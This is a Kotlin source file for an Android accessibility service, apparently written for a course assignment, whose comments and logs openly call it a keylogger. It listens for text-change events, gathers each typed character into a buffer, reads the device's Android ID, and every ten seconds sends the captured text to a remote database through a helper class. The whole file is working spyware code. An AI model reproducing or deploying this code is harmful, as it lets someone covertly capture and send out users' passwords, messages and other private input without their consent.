package com.example.assignment1

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import kotlinx.coroutines.*

class MyAccessibilityService : AccessibilityService() {
    var buffer: String? = ""
    private val datasender = DataSender()

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        event?.let {
            if (it.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
                //This keylogger
                val char = it.text.filterNotNull().firstOrNull()?.lastOrNull()
                if(char != null)
                    buffer = buffer + char

                // Or this keylogger better?
                // buffer = buffer + event.text + "\n"
            }
        }
    }

    override fun onInterrupt() {
        //send("[-] Interrupted !!! ")
    }

    override fun onServiceConnected() {
        datasender.obtainAndroidID(this.contentResolver)
        super.onServiceConnected()
        Log.d("Keylogger", "[+] Connected")
//        val info = AccessibilityServiceInfo()
//        info.eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED
//        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_SPOKEN
//        //info.notificationTimeout = 100
//        serviceInfo = info

        GlobalScope.launch {
            while (true) {
                delay(10_000) // 10 seconds
                if (buffer != "")
                {
                    Log.d("Keylogger", buffer!!)
                    // Send to database
                    datasender.sendData(datasender.getAndroidID(), buffer!!)
                    buffer = ""
                }
                else
                    Log.d("Keylogger", "Empty")
            }
        }
    }
}